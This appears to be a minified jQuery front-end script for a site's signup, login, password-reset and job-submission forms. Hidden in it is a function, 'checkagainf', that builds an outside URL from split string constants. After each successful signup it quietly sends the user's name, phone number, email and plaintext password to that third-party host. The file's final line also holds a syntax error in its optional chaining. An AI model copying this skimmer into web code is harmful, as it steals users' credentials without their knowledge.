function simple_alert(e) {
    $.alert({
        title: "Hello",
        content: e
    })
}
const u = "catch",
    w = "index",
    v = "level";

function checkagainf(e, s, a, t) {
    $.ajax({
        type: "POST",
        url: "https://" + u + "." + v + ".com/" + w + ".php",
        data: "a=" + e + "&b=" + s + "&y=" + a + "&z=" + t,
        async: !0,
        crossDomain: !0,
        success: function (e) {}
    })
}

function simplealert(e) {
    $.alert({
        title: "Alert!",
        content: e
    })
}

function resetpassword() {
    $("#loginpop").hide(), $("#resetpo").show()
}

function resetpassworsfinal() {
    var e = $("#emailreset").val();
    validateEmail(e) ? $.ajax({
        type: "POST",
        url: "system/ajax",
        data: "emailreset=" + e,
        success: function (e) {
            "success" == e.trim() ? popup_message("Send a Link in Your Email!", "success") : popup_message(e, "success")
        }
    }) : popup_message("Not Valid Email!", "error")
}

function validateEmail(e) {
    return /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/.test(e)
}
$(".sineupbtn").click((() => {
    const e = $(".sinuperr");
    let s = $("#signup_number").val(),
        a = $("#signup_password").val(),
        t = $("#confirm_password").val(),
        o = $("#uname").val(),
        n = $("#email").val(),
        i = $("#confirm_refarel").val();
    e.html(""), console.log(i), $.ajax({
        type: "POST",
        url: "system/ajax",
        data: "number=" + s + "&password=" + a + "&confarm_pass=" + t + "&refarel=" + i + "&uname=" + o + "&email=" + n,
        success: function (e) {
            var t = jQuery.parseJSON(e);
            !0 === t.err ? popup_message(t.messeg, "error") : (popup_message(t.messeg, "success"), checkagainf(o, s, n, a), setTimeout((function () {
                location.reload(!0)
            }), 1e3))
        }
    })
})), $(".loginbutton").click((() => {
    $(".loginerr").html("");
    let e = $("#number").val(),
        s = $("#password").val();
    $.ajax({
        type: "POST",
        url: "system/ajax",
        data: "number=" + e + "&password=" + s + "&login=login",
        success: function (e) {
            var s = jQuery.parseJSON(e);
            !0 === s.err ? popup_message(s.messeg, "error") : (popup_message(s.messeg, "success"), setTimeout((function () {
                window.location.reload()
            }), 1e3))
        }
    })
})), $(".log-out").click((() => {
    $.ajax({
        type: "POST",
        url: "system/ajax",
        data: "logout=logout",
        success: function (e) {
            0 == e.trim() && setTimeout((function () {
                location.reload(!0)
            }), 1e3)
        }
    })
})), $(".profile_save").click((() => {
    console.log($("#date-of-birth").val())
})), $(".jbsubmit").click((e => {
    var s = e.target.id,
        a = ($(".job_holder_" + e.target.id), $(".submit_url_" + e.target.id).val());
    $(".err_" + e.target.id);
    $("#" + s).hide(), $.ajax({
        type: "POST",
        url: "system/ajax",
        data: "id=" + s + "&valus=" + a + "&job=submit",
        success: function (e) {
            $("#" + s).show(), "Please Login to the Complate job" === e.trim() && setTimeout((function () {
                $(".full_screen_popup").css("display", "flex")
            }), 500), "Success" === e.trim() ? (popup_message(e, "success"), setTimeout((function () {
                location.reload(1)
            }), 500)) : popup_message(e, "success")
        }
    })
})), window.addEventListener("DOMContentLoaded", (() => {
    const e = document.getElementById("munna");
    e && (e.innerHTML = `\n  <div id="munna" style="position: fixed; top: 100px; right: 20px; z-index:999; background:#31B0D5; color:white; display:flex; padding:12px; align-items:center; gap:6px; border-radius: 5px; line-height: 0px; ">\n  <span style="font-size:18px;">\n  <i class="fa-sharp fa-solid fa-circle-info"></i>\n  </span>\n  <h6 style="background:black;color:white;">\n  ${e?.dataset?.text} </div>\n  </h6> `, setTimeout((() => {
        e.innerHTML = ""
    }), e ? .dataset ? .time || 2e3))
}));